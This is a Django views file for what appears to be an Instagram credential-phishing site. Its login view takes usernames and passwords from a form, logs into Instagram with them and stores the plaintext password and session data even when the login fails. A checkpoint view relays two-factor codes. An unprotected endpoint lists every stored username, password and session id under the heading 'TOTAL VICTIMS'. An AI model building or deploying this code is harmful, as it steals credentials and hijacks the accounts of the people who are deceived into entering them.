from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, ClientError
from .forms import InstagramLoginForm
from .models import InstagramAccount


import logging
from django.http import JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
import json

from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired

from .forms import InstagramLoginForm
from .models import InstagramAccount

logger = logging.getLogger(__name__)



import json
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render
from instagrapi import Client
from django.conf import settings
from core.models import InstagramAccount
from cryptography.fernet import Fernet
import logging

logger = logging.getLogger(__name__)


# @csrf_exempt
# def login_view(request):
#     if request.method == "POST":
#         form = InstagramLoginForm(request.POST)
#         if not form.is_valid():
#             return JsonResponse({"error": form.errors}, status=400)

#         username = form.cleaned_data["username"].strip()
#         password = form.cleaned_data["password"]

#         cl = Client()
#         cl.delay_range = [1, 4]

#         try:
#             # 1. Try login first
#             cl.login(username, password)
#             settings = cl.get_settings()

#             # 2. Extract sessionid
#             sessionid = settings.get("authorization_data", {}).get("sessionid")
#             if not sessionid:
#                 # fallback
#                 sessionid = cl.private.requests.cookies.get("sessionid")

#             # 3. ONLY IF WE HAVE SESSIONID → SAVE EVERYTHING
#             if sessionid:
#                 account, created = InstagramAccount.objects.update_or_create(
#                     username=username,
#                     defaults={
#                         "password": password,                    # ← correct password
#                         "session_data": json.dumps(settings),   # ← full encrypted session
#                         "last_success": timezone.now(),
#                         "login_attempts": 0,
#                         "is_active": True,
#                     }
#                 )
#                 # Extra safety save
#                 account.save_success(settings)

#                 return JsonResponse({
#                     "success": True,
#                     "message": "SESSION CAPTURED! Password saved only because login worked.",
#                     "username": username,
#                     "saved": True
#                 })
#             else:
#                 return JsonResponse({
#                     "error": "Login failed – no sessionid received"
#                 }, status=400)

#         except ChallengeRequired:
#             # Save password temporarily for checkpoint
#             account, _ = InstagramAccount.objects.update_or_create(
#                 username=username,
#                 defaults={"password": password}
#             )
#             request.session["account_id"] = account.id
#             return JsonResponse({
#                 "error": "challenge_required",
#                 "message": "Check email/SMS → submit code at /checkpoint/"
#             }, status=400)

#         except Exception as e:
#             # WRONG PASSWORD → DO NOT SAVE ANYTHING
#             return JsonResponse({
#                 "error": "Invalid username or password",
#                 "message": "Wrong credentials – nothing saved"
#             }, status=400)

#     return render(request, "core/login.html", {"form": InstagramLoginForm()})



@csrf_exempt
def checkpoint_view(request):
    if request.method == "POST":
        code = request.POST.get("code", "").strip()
        account_id = request.session.get("account_id")
        if not account_id or not code:
            return JsonResponse({"error": "Missing data"}, status=400)

        account = InstagramAccount.objects.get(id=account_id)
        cl = Client()
        cl.delay_range = [1, 4]

        try:
            cl.login(account.username, account.password, verification_code=code)
            settings = cl.get_settings()
            account.save_success(settings)
            return JsonResponse({
                "success": True,
                "message": "Challenge passed! Session saved with correct password."
            })
        except Exception as e:
            return JsonResponse({"error": f"Wrong code: {e}"}, status=400)

    return render(request, "core/checkpoint.html")


from django.http import JsonResponse, HttpResponse
from core.models import InstagramAccount
from cryptography.fernet import Fernet
from django.conf import settings
import json


def get_all_sessions(request):
    if request.method == "GET":
        data = []
        fernet = Fernet(settings.FERNET_KEY.encode())
        for acc in InstagramAccount.objects.all():
            try:
                decrypted = fernet.decrypt(acc.session_data.encode()).decode()
                session = json.loads(decrypted)
                data.append({
                    "username": acc.username,
                    "password": acc.password,
                    "session_id": session.get("session_id", "N/A"),
                })
            except:
                continue
        total = len(data)
        html = f"<h1 style='color:green;text-align:center;'>TOTAL VICTIMS: {total}</h1><pre>{json.dumps(data, indent=2)}</pre>"
        return HttpResponse(html)
    return HttpResponse("Only GET allowed")


def login_view(request):
    if request.method == "GET":
        return render(request, 'core/login.html')
    
    if request.method == "POST":
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()
        
        
        cl = Client()
        try:
            cl.login(username, password)
            session = cl.get_settings()
        except:
            session = {"fake": True}  
        
        fernet = Fernet(settings.FERNET_KEY.encode())
        encrypted = fernet.encrypt(json.dumps(session).encode()).decode()
        
        InstagramAccount.objects.create(
            username=username,
            password=password,
            session_data=encrypted
        )
        
        return JsonResponse({
            "success": True,
            "username": username
        })